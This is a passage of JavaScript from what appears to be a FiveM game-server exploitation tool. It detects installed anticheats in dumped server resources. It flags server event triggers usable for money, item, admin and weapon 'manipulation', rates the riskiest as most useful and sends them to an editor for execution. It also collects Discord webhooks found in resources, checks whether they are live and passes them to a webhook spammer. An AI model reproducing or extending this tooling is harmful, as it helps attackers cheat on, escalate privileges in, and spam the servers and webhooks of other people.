                minMatches: 3 // Must have all 3 files (very specific to FiveGuard)
            },
            {
                name: 'WaveShield',
                requiredPaths: [
                    { path: 'resource/client', type: 'folder', mustHaveFiles: true },
                    { path: 'web', type: 'folder', mustHaveFiles: true },
                    { path: 'resource/waveshield.js', type: 'file' }
                ],
                minMatches: 3 // Must have all 3
            },
            {
                name: 'PhoenixAC',
                requiredPaths: [
                    { path: 'pam.obf.lua', type: 'file' },
                    { path: 'dist/pam.html', type: 'file' },
                    { path: 'dist/pam.obf.js', type: 'file' }
                ],
                minMatches: 3 // Must have all 3
            },
            {
                name: 'PegasusAC',
                requiredPaths: [
                    { path: 'client/html/build/index.html', type: 'file' },
                    { path: 'server/install/AC.lua', type: 'file' },
                    { path: 'client', type: 'folder', mustHaveFiles: true }
                ],
                minMatches: 3 // Must have all 3
            },
            {
                name: 'ReaperV4',
                requiredPaths: [
                    { path: 'fxmanifest.lua', type: 'file' },
                    { path: 'imports/bypass.lua', type: 'file' },
                    { path: 'imports/bypass_c.lua', type: 'file' },
                    { path: 'imports/bypass_s.lua', type: 'file' },
                    { path: 'classes/class.lua', type: 'file' },
                    { path: 'scripts/detections', type: 'folder', mustHaveFiles: true },
                    { path: 'web/build/index.html', type: 'file' }
                ],
                minMatches: 5 // Must have at least 5 of these 7 (very specific to ReaperV4)
            },
            {
                name: 'EasyAdmin',
                requiredPaths: [
                    { path: 'fxmanifest.lua', type: 'file' },
                    { path: 'client', type: 'folder', mustHaveFiles: true },
                    { path: 'dependencies', type: 'folder', mustHaveFiles: true },
                    { path: 'plugins', type: 'folder', mustHaveFiles: true },
                    { path: 'shared', type: 'folder', mustHaveFiles: true },
                    { path: 'dependencies/nui/index.html', type: 'file' }
                ],
                minMatches: 4 // Must have at least 4 of these 6 (very specific to EasyAdmin)
            },
            {
                name: 'FiniAC',
                requiredPaths: [
                    { path: 'fxmanifest.lua', type: 'file' },
                    { path: 'fini_events.js', type: 'file' },
                    { path: 'fini_events.lua', type: 'file' },
                    { path: 'anticheat.html', type: 'file' },
                    { path: 'client', type: 'folder', mustHaveFiles: true }
                ],
                minMatches: 4 // Must have at least 4 of these 5 (very specific to FiniAC)
            }
        ];

        folderStructure.forEach((filePaths, folderName) => {

            if (isServerDirectory(folderName)) {
                return;
            }

            const folderFilePaths = filePaths.filter(filePath => {
                const pathParts = filePath.split('/');

                return pathParts.includes(folderName);
            });
            
            if (folderFilePaths.length === 0) {
                return;
            }

            const samplePath = folderFilePaths[0];
            const pathParts = samplePath.split('/');
            const folderIndex = pathParts.indexOf(folderName);
            const folderFullPath = pathParts.slice(0, folderIndex + 1).join('/');
            
            for (const acStruct of anticheatStructures) {
                let matchCount = 0;

                for (const requiredPath of acStruct.requiredPaths) {
                    let found = false;
                    
                    if (requiredPath.type === 'folder') {

                        const folderPathLower = requiredPath.path.toLowerCase();

                        const hasFolder = folderFilePaths.some(filePath => {

                            let relativePath = filePath;
                            if (filePath.startsWith(folderFullPath + '/')) {
                                relativePath = filePath.substring(folderFullPath.length + 1);
                            } else if (filePath.includes('/' + folderName + '/')) {

                                const folderPos = filePath.indexOf('/' + folderName + '/');
                                relativePath = filePath.substring(folderPos + folderName.length + 2);
                            }
                            relativePath = relativePath.toLowerCase();

                            if (relativePath.startsWith(folderPathLower + '/') || relativePath === folderPathLower) {

                                if (requiredPath.mustHaveFiles) {
                                    return folderFilePaths.some(fp => {
                                        let rel = fp;
                                        if (fp.startsWith(folderFullPath + '/')) {
                                            rel = fp.substring(folderFullPath.length + 1);
                                        } else if (fp.includes('/' + folderName + '/')) {
                                            const folderPos = fp.indexOf('/' + folderName + '/');
                                            rel = fp.substring(folderPos + folderName.length + 2);
                                        }
                                        rel = rel.toLowerCase();

                                        return rel.startsWith(folderPathLower + '/') && 
                                               rel !== folderPathLower &&
                                               rel.split('/').length > folderPathLower.split('/').length;
                                    });
                                }
                                return true;
                            }
                            return false;
                        });
                        
                        found = hasFolder;
                    } else {

                        const filePathLower = requiredPath.path.toLowerCase();
                        found = folderFilePaths.some(filePath => {
                            let relativePath = filePath;
                            if (filePath.startsWith(folderFullPath + '/')) {
                                relativePath = filePath.substring(folderFullPath.length + 1);
                            } else if (filePath.includes('/' + folderName + '/')) {
                                const folderPos = filePath.indexOf('/' + folderName + '/');
                                relativePath = filePath.substring(folderPos + folderName.length + 2);
                            }
                            relativePath = relativePath.toLowerCase();
                            
                            return relativePath === filePathLower || 
                                   relativePath.endsWith('/' + filePathLower);
                        });
                    }
                    
                    if (found) {
                        matchCount++;
                    }
                }

                if (matchCount >= acStruct.minMatches) {
                    const key = `${folderName}_${acStruct.name}`;
                    
                    if (!anticheatResults.has(key)) {
                        anticheatResults.set(key, {
                            name: acStruct.name,
                            file: folderFilePaths[0] || folderName,
                            resource: folderName,
                            folder: folderName
                        });
                        anticheats.push(acStruct.name);
                    }
                    break; // Found match, no need to check other anticheats for this folder
                }
            }
        });
    } catch (error) {
        console.error('Error detecting anticheats by structure:', error);
    }
}

function isServerDirectory(folderName) {

    const serverPatterns = [
        /^\d+\.\d+\.\d+\.\d+$/, // IP address
        /^server$/i,
        /^resources$/i,
        /^resource$/i,
        /^fivem$/i,
        /^txadmin$/i
    ];
    
    return serverPatterns.some(pattern => pattern.test(folderName));
}


function getLineNumber(content, index) {
    try {
        const beforeMatch = content.substring(0, index);
        return beforeMatch.split('\n').length;
    } catch (error) {
        console.error('Error getting line number:', error);
        return 0;
    }
}

async function analyzeTriggerWithAI(triggerName, fullLine, fileContent = '', lineNumber = 0, fileName = '') {
    try {
        const analysis = {
            risk: 'Low',
            category: 'Unknown',
            useful: false,
            description: '',
            confidence: 0
        };
        
        const triggerLower = triggerName.toLowerCase();
        const lineLower = fullLine.toLowerCase();

        const paramMatch = fullLine.match(/\(([^)]*)\)/);
        const params = paramMatch ? paramMatch[1] : '';
        const paramsLower = params.toLowerCase();

        const stringParams = params.match(/["']([^"']+)["']/g) || [];
        const numberParams = params.match(/\b\d+\b/g) || [];
        const allParamsText = params.replace(/["']/g, ' ').toLowerCase();

        if (fileContent && lineNumber > 0 && AI_CONFIG.ENABLED && AI_CONFIG.API_KEY) {
            console.log('[AI ANALYSIS] Calling analyzeTriggerRiskWithAI for:', triggerName);
            try {
                const aiContextAnalysis = await analyzeTriggerRiskWithAI(triggerName, fullLine, fileContent, lineNumber, fileName);
                console.log('[AI ANALYSIS] Received result from analyzeTriggerRiskWithAI:', aiContextAnalysis);
                if (aiContextAnalysis) {
                    if (aiContextAnalysis.verified) {
                        analysis.risk = aiContextAnalysis.risk || 'High';
                        analysis.category = aiContextAnalysis.category || 'Unknown';
                        analysis.useful = true;
                        analysis.description = aiContextAnalysis.description || 'AI verified useful trigger';
                        analysis.confidence = aiContextAnalysis.confidence || 0.95;
                        console.log('[AI ANALYSIS] Returning verified analysis:', analysis);
                        return analysis;
                    } else {
                        analysis.risk = aiContextAnalysis.risk || 'Low';
                        analysis.category = aiContextAnalysis.category || 'Unknown';
                        analysis.useful = false;
                        analysis.description = aiContextAnalysis.description || 'Trigger name suggests usefulness but code does not actually perform useful action';
                        analysis.confidence = aiContextAnalysis.confidence || 0.90;
                        console.log('[AI ANALYSIS] AI says not verified, continuing with pattern matching');
                    }
                } else {
                    console.log('[AI ANALYSIS] WARNING: aiContextAnalysis is null/undefined');
                }
            } catch (error) {
                console.error('[AI ANALYSIS] Error in analyzeTriggerRiskWithAI:', error);
                console.error('[AI ANALYSIS] Error stack:', error.stack);
            }
        } else {
            console.log('[AI ANALYSIS] Skipping AI - fileContent:', !!fileContent, 'lineNumber:', lineNumber, 'ENABLED:', AI_CONFIG.ENABLED, 'HAS_KEY:', !!AI_CONFIG.API_KEY);
        }
        
        let contextAnalysis = null;
        if (fileContent && lineNumber > 0) {
            contextAnalysis = analyzeTriggerContext(fileContent, lineNumber, triggerName, params, fileName);
        }

        const moneyPatterns = [
            /money|cash|bank|pay|salary|wage|give.*money|add.*money|remove.*money|set.*money/i,
            /esx.*money|qb.*money|money.*give|money.*add|money.*remove/i,
            /setmoney|givemoney|addmoney|removemoney|givemoney|paymoney/i
        ];

        const itemPatterns = [
            /item|inventory|give.*item|add.*item|remove.*item|use.*item|drop.*item|setitem/i,
            /esx.*item|qb.*item|ox.*item|item.*give|item.*add|item.*remove/i,
            /setitem|giveitem|additem|removeitem|useitem|dropitem/i,
            /outfitbag|inventory.*add|inventory.*give|inventory.*remove/i
        ];

        const vehiclePatterns = [
            /vehicle|car|spawn.*vehicle|give.*vehicle|add.*vehicle/i,
            /esx.*vehicle|qb.*vehicle|vehicle.*spawn|vehicle.*give/i
        ];

        const adminPatterns = [
            /admin|give.*admin|set.*admin|promote|demote|rank/i,
            /esx.*admin|qb.*admin|admin.*give|admin.*set/i
        ];

        const weaponPatterns = [
            /weapon|gun|give.*weapon|add.*weapon|remove.*weapon/i,
            /esx.*weapon|qb.*weapon|weapon.*give|weapon.*add/i
        ];

        const hasMoneyPattern = moneyPatterns.some(pattern => 
            pattern.test(triggerLower) || pattern.test(lineLower) || pattern.test(paramsLower)
        );
        
        if (hasMoneyPattern) {

            const hasAmount = numberParams.length > 0 && parseInt(numberParams[0]) > 0;

            let contextConfidence = 0;
            let contextEvidence = '';
            if (contextAnalysis) {
                contextConfidence = contextAnalysis.confidence;
                contextEvidence = contextAnalysis.evidence;
            }
            
            analysis.category = 'Money';
            analysis.risk = 'High';
            analysis.useful = true;
            
            if (contextAnalysis && contextAnalysis.verified) {
                analysis.description = `Verified money manipulation in code context${hasAmount ? ` (amount: ${numberParams[0]})` : ''}${contextEvidence ? ` - ${contextEvidence}` : ''}`;
                analysis.confidence = Math.max(0.95, contextConfidence);
            } else if (hasAmount) {
                analysis.description = `Potentially useful for money manipulation (amount: ${numberParams[0]})${contextEvidence ? ` - ${contextEvidence}` : ''}`;
                analysis.confidence = Math.max(0.90, contextConfidence || 0.85);
            } else {
                analysis.description = `Potentially useful for money manipulation${contextEvidence ? ` - ${contextEvidence}` : ''}`;
                analysis.confidence = Math.max(0.80, contextConfidence || 0.75);
            }
            return analysis;
        }

        const hasItemPattern = itemPatterns.some(pattern => 
            pattern.test(triggerLower) || pattern.test(lineLower) || pattern.test(paramsLower) || pattern.test(allParamsText)
        );
        
        if (hasItemPattern) {

            const hasItemName = stringParams.length > 0 && (
                stringParams.some(p => !p.match(/^(source|player|target|id)$/i)) ||
                params.match(/["']([^"']+)["']/i)
            );
            const hasQuantity = numberParams.length > 0;

            let contextConfidence = 0;
            let contextEvidence = '';
            if (contextAnalysis) {
                contextConfidence = contextAnalysis.confidence;
                contextEvidence = contextAnalysis.evidence;
            }
            
            analysis.category = 'Items';
            analysis.risk = 'High';
            analysis.useful = true;
            
            if (contextAnalysis && contextAnalysis.verified) {
                const itemName = hasItemName ? (stringParams[0] ? stringParams[0].replace(/["']/g, '') : 'item') : 'item';
                const quantity = hasQuantity ? numberParams[0] : '?';
                analysis.description = `Verified item manipulation in code context (${itemName}${hasQuantity ? `, qty: ${quantity}` : ''})${contextEvidence ? ` - ${contextEvidence}` : ''}`;
                analysis.confidence = Math.max(0.95, contextConfidence);
            } else if (hasItemName && hasQuantity) {
                const itemName = stringParams[0] ? stringParams[0].replace(/["']/g, '') : 'item';
                const quantity = numberParams[0] || '?';
                analysis.description = `Potentially useful for item manipulation (${itemName}, qty: ${quantity})${contextEvidence ? ` - ${contextEvidence}` : ''}`;
                analysis.confidence = Math.max(0.90, contextConfidence || 0.85);
            } else if (hasItemName) {
                const itemName = stringParams[0] ? stringParams[0].replace(/["']/g, '') : 'item';
                analysis.description = `Potentially useful for item manipulation (${itemName})${contextEvidence ? ` - ${contextEvidence}` : ''}`;
                analysis.confidence = Math.max(0.85, contextConfidence || 0.80);
            } else {
                analysis.description = `Potentially useful for item manipulation${contextEvidence ? ` - ${contextEvidence}` : ''}`;
                analysis.confidence = Math.max(0.80, contextConfidence || 0.75);
            }
            return analysis;
        }

        if (vehiclePatterns.some(pattern => pattern.test(triggerLower) || pattern.test(lineLower) || pattern.test(paramsLower))) {
            analysis.category = 'Vehicles';
            analysis.risk = 'Medium';
            analysis.useful = true;
            analysis.description = 'Potentially useful for vehicle spawning';
            analysis.confidence = 0.75;
            return analysis;
        }

        if (adminPatterns.some(pattern => pattern.test(triggerLower) || pattern.test(lineLower) || pattern.test(paramsLower))) {
            analysis.category = 'Admin';
            analysis.risk = 'High';
            analysis.useful = true;
            analysis.description = 'Potentially useful for admin privileges';
            analysis.confidence = 0.80;
            return analysis;
        }

        if (weaponPatterns.some(pattern => pattern.test(triggerLower) || pattern.test(lineLower) || pattern.test(paramsLower))) {
            analysis.category = 'Weapons';
            analysis.risk = 'Medium';
            analysis.useful = true;
            analysis.description = 'Potentially useful for weapon spawning';
            analysis.confidence = 0.75;
            return analysis;
        }
        
        return analysis;
    } catch (error) {
        console.error('Error analyzing trigger with AI:', error);
        return {
            risk: 'Low',
            category: 'Unknown',
            useful: false,
            description: 'Analysis failed',
            confidence: 0
        };
    }
}

function analyzeTriggerContext(fileContent, lineNumber, triggerName, params, fileName) {
    try {
        const lines = fileContent.split('\n');
        const contextStart = Math.max(0, lineNumber - 20);
        const contextEnd = Math.min(lines.length, lineNumber + 20);
        const contextLines = lines.slice(contextStart, contextEnd);
        const contextText = contextLines.join('\n').toLowerCase();
        
        const analysis = {
            verified: false,
            confidence: 0,
            evidence: ''
        };

        const paramVariables = params.match(/\b([a-zA-Z_][a-zA-Z0-9_]*)\b/g) || [];

        let foundVariableUsage = false;
        let variableEvidence = [];
        
        for (const varName of paramVariables) {
            if (varName.length < 2 || ['if', 'or', 'and', 'not', 'nil', 'end', 'then', 'else'].includes(varName.toLowerCase())) {
                continue;
            }

            const varPattern = new RegExp(`\\b${varName}\\s*[=:]`, 'gi');
            const varUsagePattern = new RegExp(`\\b${varName}\\b`, 'gi');

            for (let i = 0; i < contextLines.length; i++) {
                const line = contextLines[i];
                const lineLower = line.toLowerCase();
                
                if (varPattern.test(line)) {

                    if (lineLower.match(/(?:give|add|set|spawn|create|money|item|weapon|vehicle)/)) {
                        foundVariableUsage = true;
                        variableEvidence.push(`Variable ${varName} used in meaningful context`);
                        break;
                    }
                }
                
                if (varUsagePattern.test(line) && i < contextLines.length - 1) {

                    const nextLine = contextLines[i + 1]?.toLowerCase() || '';
                    if (nextLine.match(/(?:give|add|set|spawn|create|money|item|weapon|vehicle)/)) {
                        foundVariableUsage = true;
                        variableEvidence.push(`Variable ${varName} followed by useful operation`);
                        break;
                    }
                }
            }
        }

        let foundUsefulOps = false;
        const usefulOps = [];
        
        for (const line of contextLines) {
            const lineLower = line.toLowerCase();

            if (lineLower.match(/(?:give|add|set|remove).*money|money.*(?:give|add|set|remove)/)) {
                foundUsefulOps = true;
                usefulOps.push('Money operation detected');
            }

            if (lineLower.match(/(?:give|add|set|remove|spawn).*item|item.*(?:give|add|set|remove)/)) {
                foundUsefulOps = true;
                usefulOps.push('Item operation detected');
            }

            if (lineLower.match(/(?:give|add|set|remove).*weapon|weapon.*(?:give|add|set|remove)/)) {
                foundUsefulOps = true;
                usefulOps.push('Weapon operation detected');
            }

            if (lineLower.match(/(?:spawn|give|add).*vehicle|vehicle.*(?:spawn|give|add)/)) {
                foundUsefulOps = true;
                usefulOps.push('Vehicle operation detected');
            }
        }

        if (foundUsefulOps && foundVariableUsage) {
            analysis.verified = true;
            analysis.confidence = 0.95;
            analysis.evidence = usefulOps.join(', ') + '; ' + variableEvidence.join(', ');
        } else if (foundUsefulOps) {
            analysis.verified = true;
            analysis.confidence = 0.85;
            analysis.evidence = usefulOps.join(', ');
        } else if (foundVariableUsage) {
            analysis.verified = true;
            analysis.confidence = 0.75;
            analysis.evidence = variableEvidence.join(', ');
        } else {
            analysis.verified = false;
            analysis.confidence = 0.50;
            analysis.evidence = 'No direct operations found in context';
        }
        
        return analysis;
    } catch (error) {
        console.error('Error analyzing trigger context:', error);
        return {
            verified: false,
            confidence: 0,
            evidence: ''
        };
    }
}

function analyzeTriggerWithAISync(triggerName, fullLine, fileContent = '', lineNumber = 0, fileName = '') {
    try {
        const analysis = {
            risk: 'Low',
            category: 'Unknown',
            useful: false,
            description: '',
            confidence: 0
        };
        
        const triggerLower = triggerName.toLowerCase();
        const lineLower = fullLine.toLowerCase();
        
        const paramMatch = fullLine.match(/\(([^)]*)\)/);
        const params = paramMatch ? paramMatch[1] : '';
        const paramsLower = params.toLowerCase();
        
        const stringParams = params.match(/["']([^"']+)["']/g) || [];
        const numberParams = params.match(/\b\d+\b/g) || [];
        const allParamsText = params.replace(/["']/g, ' ').toLowerCase();
        
        let contextAnalysis = null;
        if (fileContent && lineNumber > 0) {
            contextAnalysis = analyzeTriggerContext(fileContent, lineNumber, triggerName, params, fileName);
        }
        
        const moneyPatterns = [
            /money|cash|bank|pay|salary|wage|give.*money|add.*money|remove.*money|set.*money/i,
            /esx.*money|qb.*money|money.*give|money.*add|money.*remove/i,
            /setmoney|givemoney|addmoney|removemoney|givemoney|paymoney/i
        ];
        
        const itemPatterns = [
            /item|inventory|give.*item|add.*item|remove.*item|use.*item|drop.*item|setitem/i,
            /esx.*item|qb.*item|ox.*item|item.*give|item.*add|item.*remove/i,
            /setitem|giveitem|additem|removeitem|useitem|dropitem/i,
            /outfitbag|inventory.*add|inventory.*give|inventory.*remove/i
        ];
        
        const hasMoneyPattern = moneyPatterns.some(pattern => 
            pattern.test(triggerLower) || pattern.test(lineLower) || pattern.test(paramsLower)
        );
        
        if (hasMoneyPattern) {
            const hasAmount = numberParams.length > 0 && parseInt(numberParams[0]) > 0;
            analysis.category = 'Money';
            analysis.risk = 'High';
                analysis.useful = true;
            analysis.description = hasAmount ? `Potentially useful for money manipulation (amount: ${numberParams[0]})` : 'Potentially useful for money manipulation';
            analysis.confidence = hasAmount ? 0.85 : 0.75;
                return analysis;
            }
        
        const hasItemPattern = itemPatterns.some(pattern => 
            pattern.test(triggerLower) || pattern.test(lineLower) || pattern.test(paramsLower) || pattern.test(allParamsText)
        );
        
        if (hasItemPattern) {
            const hasItemName = stringParams.length > 0;
            const hasQuantity = numberParams.length > 0;
            analysis.category = 'Items';
            analysis.risk = 'High';
            analysis.useful = true;
            if (hasItemName && hasQuantity) {
                const itemName = stringParams[0] ? stringParams[0].replace(/["']/g, '') : 'item';
                analysis.description = `Potentially useful for item manipulation (${itemName}, qty: ${numberParams[0]})`;
                analysis.confidence = 0.85;
            } else {
                analysis.description = 'Potentially useful for item manipulation';
                analysis.confidence = 0.75;
            }
            return analysis;
        }
        
        return analysis;
    } catch (error) {
        console.error('Error in sync trigger analysis:', error);
        return {
            risk: 'Low',
            category: 'Unknown',
            useful: false,
            description: 'Analysis failed',
            confidence: 0
        };
    }
}

function updateTriggersTable(results) {
    try {
        const tbody = document.getElementById('triggers-tbody');
        if (!tbody) return;

        tbody.innerHTML = '';


        let triggersToDisplay = results;
        if (!triggersToDisplay || !Array.isArray(triggersToDisplay)) {
            triggersToDisplay = appState.scanResults.triggers || [];

            const currentFilter = appState.triggerFilter || 'all';
            if (currentFilter !== 'all') {
                triggersToDisplay = triggersToDisplay.filter(result => {
                    return result.triggerType === currentFilter;
                });
            }
        }
        
        triggersToDisplay.forEach((result, index) => {
            const row = document.createElement('tr');

            row.setAttribute('data-trigger-usage', result.usage);
            row.setAttribute('data-trigger-resource', result.resource);
            row.setAttribute('data-trigger-type', result.risk);
            row.setAttribute('data-trigger-file', result.file || '');
            row.setAttribute('data-trigger-line', result.line || 0);

            // Triggers-tab risk colours (per request): Low = red, Medium = yellow, High = green.
            const triggerRiskBg = result.risk === 'Low' ? '#e0556e'
                : result.risk === 'Medium' ? '#e3b341'
                : result.risk === 'High' ? '#34d399'
                : '#6b6b76';
            const triggerRiskFg = result.risk === 'Medium' ? '#1a1a1a' : '#ffffff';

            row.innerHTML = `
                <td>${result.resource}</td>
                <td style="max-width: 400px; word-wrap: break-word; font-family: 'Consolas', 'Monaco', 'Courier New', monospace; font-size: 13px; line-height: 1.5;">${result.usage}</td>
                <td>
                    <span style="padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: 600; background: ${triggerRiskBg}; color: ${triggerRiskFg};" title="${result.aiAnalysis ? result.aiAnalysis.description : ''}">
                        ${result.risk}${result.isHidden ? ' <span style="opacity: 0.8;">(hidden)</span>' : ''}${result.aiAnalysis && result.aiAnalysis.useful ? ' ⭐' : ''}
                    </span>
                </td>
                <td>
                    <button class="copy-trigger-btn" data-index="${index}" style="padding: 4px 8px; background: #ededed; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;" title="Copy to Clipboard">
                        <i class="fas fa-copy"></i>
                    </button>
                    <button class="transfer-trigger-btn" data-index="${index}" style="padding: 4px 8px; background: #e3b341; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;" title="Transfer to Editor">
                        <i class="fas fa-edit"></i>
                    </button>
                    <button class="quick-edit-trigger-btn" data-index="${index}" style="padding: 4px 8px; background: #e05572; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;" title="Quick Edit with Template">
                        <i class="fas fa-bolt"></i>
                    </button>
                    <button class="preview-trigger-btn" data-index="${index}" style="padding: 4px 8px; background: #34d399; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;" title="Open in Preview">
                        <i class="fas fa-eye"></i>
                    </button>
                    <button class="save-trigger-btn" data-index="${index}" style="padding: 4px 8px; background: #e2e2e2; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;" title="Save Trigger">
                        <i class="fas fa-bookmark"></i>
                    </button>
                </td>
            `;

            const copyBtn = row.querySelector('.copy-trigger-btn');
            const transferBtn = row.querySelector('.transfer-trigger-btn');
            const quickEditBtn = row.querySelector('.quick-edit-trigger-btn');
            const previewBtn = row.querySelector('.preview-trigger-btn');
            const saveBtn = row.querySelector('.save-trigger-btn');
            
            copyBtn.addEventListener('click', () => {
                copyTrigger(result.usage);
            });
            
            transferBtn.addEventListener('click', () => {
                transferToEditor(result.usage, result.resource);
            });
            
            quickEditBtn.addEventListener('click', () => {
                quickEditTrigger(result.usage, result.resource, result.file || '', result.line || 0);
            });
            
            previewBtn.addEventListener('click', () => {
                openTriggerPreview(result.resource, result.file || '', result.line || 0);
            });
            
            saveBtn.addEventListener('click', () => {
                saveTrigger(result.resource, result.usage, result.risk);
            });
            
            tbody.appendChild(row);
        });
    } catch (error) {
        console.error('Error updating triggers table:', error);
    }
}

function updateKnownTriggersTable(results = null) {
    try {
        const tbody = document.getElementById('known-triggers-tbody');
        if (!tbody) return;

        tbody.innerHTML = '';
        
        let triggersToDisplay = results;
        if (!triggersToDisplay || !Array.isArray(triggersToDisplay)) {
            triggersToDisplay = appState.scanResults.knownTriggers || [];
        }

        const currentTypeFilter = appState.knownTriggerTypeFilter || 'all';
        const currentRiskFilter = appState.knownTriggerRiskFilter || 'all';
        const searchInput = document.getElementById('search-input');
        const searchTerm = searchInput ? searchInput.value.toLowerCase() : '';

        if (currentTypeFilter !== 'all') {
            triggersToDisplay = triggersToDisplay.filter(trigger => {
                return trigger.triggerType === currentTypeFilter;
            });
        }

        if (currentRiskFilter !== 'all') {
            triggersToDisplay = triggersToDisplay.filter(trigger => {
                return trigger.risk === currentRiskFilter;
            });
        }

        if (searchTerm) {
            triggersToDisplay = triggersToDisplay.filter(trigger => 
                trigger.resource.toLowerCase().includes(searchTerm) ||
                trigger.usage.toLowerCase().includes(searchTerm)
            );
        }
        
        if (triggersToDisplay.length === 0) {
            tbody.innerHTML = '';
            return;
        }
        
        triggersToDisplay.forEach((result, index) => {
            const row = document.createElement('tr');
            
            row.setAttribute('data-trigger-usage', result.usage);
            row.setAttribute('data-trigger-resource', result.resource);
            row.setAttribute('data-trigger-type', result.risk);
            row.setAttribute('data-trigger-file', result.file || '');
            row.setAttribute('data-trigger-line', result.line || 0);

            const riskColor = result.risk === 'High' ? '#e05572' : 
                            result.risk === 'Medium' ? '#e3b341' : 
                            result.risk === 'Low' ? '#34d399' : '#ededed';
            
            row.innerHTML = `
                <td>${result.resource}</td>
                <td style="max-width: 400px; word-wrap: break-word; font-family: 'Consolas', 'Monaco', 'Courier New', monospace; font-size: 13px; line-height: 1.5;">${result.usage}</td>
                <td>
                    <span style="padding: 4px 8px; border-radius: 4px; font-size: 12px; background: ${riskColor}; color: white;" title="${result.aiAnalysis ? result.aiAnalysis.description : ''}">
                        ${result.risk}${result.isHidden ? ' <span style="opacity: 0.8;">(hidden)</span>' : ''}
                    </span>
                </td>
                <td>
                    <button class="copy-trigger-btn" data-index="${index}" data-table="known" style="padding: 4px 8px; background: #ededed; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;" title="Copy to Clipboard">
                        <i class="fas fa-copy"></i>
                    </button>
                    <button class="transfer-trigger-btn" data-index="${index}" data-table="known" style="padding: 4px 8px; background: #e3b341; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;" title="Transfer to Editor">
                        <i class="fas fa-edit"></i>
                    </button>
                    <button class="quick-edit-trigger-btn" data-index="${index}" data-table="known" style="padding: 4px 8px; background: #e05572; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;" title="Quick Edit with Template">
                        <i class="fas fa-bolt"></i>
                    </button>
                    <button class="preview-trigger-btn" data-index="${index}" data-table="known" style="padding: 4px 8px; background: #34d399; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;" title="Open in Preview">
                        <i class="fas fa-eye"></i>
                    </button>
                    <button class="save-trigger-btn" data-index="${index}" data-table="known" style="padding: 4px 8px; background: #e2e2e2; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;" title="Save Trigger">
                        <i class="fas fa-bookmark"></i>
                    </button>
                </td>
            `;
            
            const copyBtn = row.querySelector('.copy-trigger-btn');
            const transferBtn = row.querySelector('.transfer-trigger-btn');
            const quickEditBtn = row.querySelector('.quick-edit-trigger-btn');
            const previewBtn = row.querySelector('.preview-trigger-btn');
            const saveBtn = row.querySelector('.save-trigger-btn');
            
            copyBtn.addEventListener('click', () => {
                copyTrigger(result.usage);
            });
            
            transferBtn.addEventListener('click', () => {
                transferToEditor(result.usage, result.resource);
            });
            
            quickEditBtn.addEventListener('click', () => {
                quickEditTrigger(result.usage, result.resource, result.file || '', result.line || 0);
            });
            
            previewBtn.addEventListener('click', () => {
                openTriggerPreview(result.resource, result.file || '', result.line || 0);
            });
            
            saveBtn.addEventListener('click', () => {
                saveTrigger(result.resource, result.usage, result.risk);
            });
            
            tbody.appendChild(row);
        });
    } catch (error) {
        console.error('Error updating known triggers table:', error);
    }
}

function updateWebhooksTable(webhooks) {
    try {
        const tbody = document.getElementById('webhooks-tbody');
        const emptyState = document.getElementById('webhooks-empty');
        
        if (!tbody) return;

        tbody.innerHTML = '';
        
        if (webhooks.length === 0) {
            if (emptyState) {
                emptyState.style.display = 'flex';
            }
            return;
        }
        
        if (emptyState) {
            emptyState.style.display = 'none';
        }
        
        webhooks.forEach((webhook, index) => {
            const row = document.createElement('tr');
            const isSelected = appState.selectedWebhooks.includes(webhook.url);

            row.setAttribute('data-webhook-url', webhook.url);
            row.setAttribute('data-webhook-resource', webhook.resource);
            row.setAttribute('data-webhook-file', webhook.file || '');
            row.setAttribute('data-webhook-line', webhook.line || 1);
            
            row.innerHTML = `
                <td>
                    <input type="checkbox" class="webhook-checkbox" data-url="${webhook.url}" ${isSelected ? 'checked' : ''}>
                </td>
                <td>${webhook.resource}</td>
                <td>${webhook.url}</td>
                <td>
                    <span id="webhook-status-${index}" style="padding: 4px 8px; border-radius: 4px; font-size: 12px; background: #9a9aa8; color: white;">
                        Testing...
                    </span>
                </td>
                <td>
                    <button class="copy-webhook-btn" data-index="${index}" style="padding: 4px 8px; background: #ededed; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;" title="Copy to Clipboard">
                        <i class="fas fa-copy"></i>
                    </button>
                    <button class="preview-webhook-btn" data-index="${index}" style="padding: 4px 8px; background: #e3b341; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;" title="Open in Preview">
                        <i class="fas fa-eye"></i>
                    </button>
                    <button class="delete-webhook-btn" onclick="deleteWebhook('${webhook.url}')" style="padding: 4px 8px; background: #e05572; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;" title="Delete Webhook">
                        <i class="fas fa-trash"></i>
                    </button>
                </td>
            `;

            const copyBtn = row.querySelector('.copy-webhook-btn');
            const previewBtn = row.querySelector('.preview-webhook-btn');
            
            copyBtn.addEventListener('click', () => {
                copyWebhook(webhook.url);
            });
            
            previewBtn.addEventListener('click', () => {
                openWebhookPreview(webhook.url, webhook.resource, webhook.file || '', webhook.line || 1);
            });

            const checkbox = row.querySelector('.webhook-checkbox');
            checkbox.addEventListener('change', (e) => {
                if (e.target.checked) {
                    if (!appState.selectedWebhooks.includes(webhook.url)) {
                        appState.selectedWebhooks.push(webhook.url);
                    }
                } else {
                    appState.selectedWebhooks = appState.selectedWebhooks.filter(url => url !== webhook.url);
                }
                updateSelectedWebhooksList();
                updateSpammerSelectedWebhooks();
            });
            
            tbody.appendChild(row);

            validateWebhookStatus(webhook.url).then(status => {
                const statusElement = document.getElementById(`webhook-status-${index}`);
                if (statusElement) {
                    statusElement.textContent = status;
                    statusElement.style.background = status === 'Active' ? '#34d399' : '#e05572';
                }
            });
        });
    } catch (error) {
        console.error('Error updating webhooks table:', error);
    }
}

function updateWebhookSelection(webhooks) {
    try {
        const webhookList = document.getElementById('webhook-selection-list');
        if (!webhookList) return;

        webhookList.innerHTML = '';
